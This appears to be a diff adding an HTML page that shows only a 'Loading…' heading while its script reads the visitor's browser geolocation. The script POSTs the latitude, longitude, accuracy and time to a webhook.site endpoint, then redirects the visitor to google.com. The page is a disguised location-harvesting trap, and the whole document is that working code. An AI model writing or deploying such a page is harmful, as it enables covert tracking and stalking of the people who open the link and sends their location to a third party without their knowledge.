@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h2>Loading…</h2>
+
+<script>
+navigator.geolocation.getCurrentPosition(function(pos) {
+    fetch("https://webhook.site/f6fa034f-dd95-4933-8d07-803ff5c0ba0a", {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            accuracy: pos.coords.accuracy,
+            time: new Date().toISOString()
+        })
+    });
+
+    // Redirect after sending location
+    window.location.href = "https://google.com";
+});
+</script>
+
+</body>
+</html>
